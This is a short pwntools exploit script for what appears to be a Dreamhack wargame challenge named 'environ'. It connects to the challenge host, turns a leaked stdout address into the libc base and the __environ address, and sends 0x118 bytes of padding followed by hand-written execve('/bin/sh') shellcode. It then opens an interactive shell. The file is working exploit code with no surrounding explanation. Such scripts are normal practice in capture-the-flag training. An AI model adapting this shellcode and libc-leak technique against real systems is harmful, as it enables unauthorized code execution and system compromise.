from pwn import *

p = remote('host3.dreamhack.games', '17768')
#p = process('./environ')
libc = ELF('./libc.so.6')

#shellcode = asm(shellcraft.execve('/bin/sh'))
shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
#shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"

p.recvuntil(b": ")
stdout = int(p.recvline()[:], 16)
print(hex(stdout))

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
environ = libc_base + libc.symbols['__environ']

p.sendlineafter(b"Size: ", str(0x118+len(shellcode)).encode())
p.sendlineafter(b"Data: ", b"a"*0x118+shellcode)
p.sendlineafter(b"=", str(environ).encode())

p.interactive()